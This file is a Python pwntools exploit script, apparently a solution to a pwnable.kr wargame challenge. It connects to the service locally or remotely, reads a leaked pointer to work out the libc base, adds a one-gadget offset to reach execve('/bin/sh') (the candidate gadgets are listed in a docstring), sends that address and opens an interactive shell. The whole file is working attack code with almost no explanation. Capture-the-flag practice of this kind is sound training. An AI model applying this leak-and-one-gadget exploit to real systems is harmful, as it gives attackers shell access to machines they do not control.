import os
import argparse
from pwn import *

'''
0x3ac6c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

0x3ac6e execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3ac72 execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL

0x3ac79 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5fbd5 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5fbd6 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL
'''

context.log_level = 'debug'


ADDR = 'pwnable.kr'
PORT = 9018


BIN_PATH = './exploitable'
LIBC_PATH_REMOTE = './libc.so.6'
LIBC_PATH_LOCAL = '/lib/i386-linux-gnu/libc-2.31.so'
LIBC_PATH = LIBC_PATH_LOCAL
e = ELF(BIN_PATH)
libc = ELF(LIBC_PATH)



def start_process():
    parser = argparse.ArgumentParser()
    parser.add_argument('mode', choices=['local', 'remote'])
    args = parser.parse_args()

    p = None

    if args.mode == 'local':
        log.info('running locally...')
        p = process(BIN_PATH)
    elif args.mode == 'remote':
        log.info('pwning...')
        p = remote(ADDR, PORT)

        global libc, LIBC_PATH
        LIBC_PATH = LIBC_PATH_REMOTE
        libc = ELF(LIBC_PATH)
    else:
        log.critical('invalid option')
        os.exit(1)
    return p


def main():
    p = start_process()

    libc_address = u32(p.recv(4)) - libc.symbols._IO_2_1_stdout_
    log.info("libc address: 0x{:08x}".format(libc_address))

    address_to_send = libc_address + 0x3ac6c
    if libc_address > 0x7fffffff:
        address_to_send -= 0x100000000
    p.sendline(str(address_to_send))
    p.interactive()


if __name__ == '__main__':
    main()

